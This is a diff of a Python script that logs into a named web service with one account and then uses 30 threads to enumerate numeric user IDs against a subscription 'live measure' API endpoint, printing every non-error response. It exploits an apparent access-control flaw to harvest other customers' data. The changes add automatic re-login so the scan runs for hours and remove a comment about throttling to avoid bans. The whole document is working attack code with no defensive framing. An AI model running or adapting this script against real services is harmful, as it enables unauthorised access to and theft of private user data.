@@ -1,65 +1,115 @@
 import requests
 from concurrent.futures import ThreadPoolExecutor
 import time
+import threading
 
-#replace username, password, CNT ID
+# ----------------------------
+# CONFIG
+# ----------------------------
 USERNAME = "foobar@network.com"
 PASSWORD = "passwd"
 CNT_ID = "1234567890"
 
-
 BASE_URL = "https://esoftlink.esoftthings.com"
 
+THREADS = 30
+RELOGIN_INTERVAL = 2 * 60 * 60  # 2 heures
+
 # ----------------------------
-# SESSION LOGIN
+# GLOBAL STATE
 # ----------------------------
 session = requests.Session()
+PHPSESSID = None
+lock = threading.Lock()
 
-login_url = f"{BASE_URL}/login_check"
+last_login_time = 0
 
-r = session.post(
-    login_url,
-    data={
-        "_username": USERNAME,
-        "_password": PASSWORD
-    },
-    allow_redirects=False,
-    timeout=10
-)
+# ----------------------------
+# LOGIN FUNCTION
+# ----------------------------
+def login():
+    global PHPSESSID, last_login_time, session
 
-cookies = session.cookies.get_dict()
+    print("[+] Re-login...")
 
-if "PHPSESSID" not in cookies:
-    print("Login failed - no PHPSESSID")
-    exit(1)
+    s = requests.Session()
 
-print(f"[+] PHPSESSID={cookies['PHPSESSID']}")
+    r = s.post(
+        f"{BASE_URL}/login_check",
+        data={
+            "_username": USERNAME,
+            "_password": PASSWORD
+        },
+        allow_redirects=False,
+        timeout=10
+    )
+
+    cookies = s.cookies.get_dict()
+
+    if "PHPSESSID" not in cookies:
+        print("Login failed - no PHPSESSID")
+        return False
+
+    with lock:
+        session = s
+        PHPSESSID = cookies["PHPSESSID"]
+        last_login_time = time.time()
+
+    print(f"[+] PHPSESSID refreshed")
+
+    return True
+
+# ----------------------------
+# CHECK LOGIN EXPIRATION
+# ----------------------------
+def ensure_login():
+    global last_login_time
+
+    if time.time() - last_login_time > RELOGIN_INTERVAL:
+        login()
 
 # ----------------------------
 # WORKER
 # ----------------------------
+
 def check_user(user_id):
-    url = f"{BASE_URL}/api/subscription/{user_id}/{CNT_ID}/measure/live.json"
+    ensure_login()
 
-    try:
-        r = session.get(url, timeout=5)
+    user_raw = str(user_id)
+    user_padded = str(user_id).zfill(6)
 
-        # filtre comme ton script bash
-        if '"error"' not in r.text:
-            print(f"\nUserId={user_id}")
-            print(r.text)
-            print("-" * 40)
+    seen = set()
 
-    except requests.RequestException:
-        pass
+    for user_str in (user_raw, user_padded):
 
-    # léger throttle pour éviter ban / overload serveur
+        if user_str in seen:
+            continue
+        seen.add(user_str)
+
+        url = f"{BASE_URL}/api/subscription/{user_str}/{CNT_ID}/measure/live.json"
+
+        try:
+            with lock:
+                s = session
+
+            r = s.get(url, timeout=5)
+
+            if '"error"' not in r.text:
+                print(f"\nUserId={user_str}")
+                print(r.text)
+                print("-" * 40)
+
+        except requests.RequestException:
+            pass
+
     time.sleep(0.01)
 
+
 # ----------------------------
-# THREAD POOL CONFIG
+# START
 # ----------------------------
-THREADS = 30  # ajuste selon ta machine (20-50 OK)
+if not login():
+    exit(1)
 
 print("[+] Scanning...")
 
